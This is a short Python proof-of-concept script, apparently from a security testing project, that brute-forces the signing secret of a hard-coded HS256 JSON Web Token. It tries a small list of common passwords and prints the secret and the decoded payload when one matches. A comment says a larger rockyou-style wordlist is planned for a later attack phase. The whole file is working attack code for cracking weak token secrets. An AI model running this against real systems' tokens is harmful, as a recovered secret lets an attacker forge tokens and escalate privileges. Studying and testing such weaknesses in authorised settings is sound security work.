import jwt;

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhYzE5YmFlOTEyNjgyZjgwZmE4ODZkMyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkxMTc5MTAxLCJleHAiOjE3OTExODI3MDF9.qhRon8_8H2QqMu46uLJAebNK5kbHxCjO94HELiLyIYA"


# Small sample wordlist for proof-of-concept — a proper wordlist file
# (e.g. a trimmed rockyou.txt) will be used in the full Attack Scripts phase

wordlist = ["123456", "password", "admin", "secret", "secret123", "letmein", "qwerty"]

for guess in wordlist:
    try:
        decoded = jwt.decode(token, guess, algorithms=["HS256"], options={"verify_exp": False})
        print(f"[+] SECRET FOUND: '{guess}'")
        print(f"[+] Decoded payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        continue
else:
    print("[-] Secret not found in wordlist")

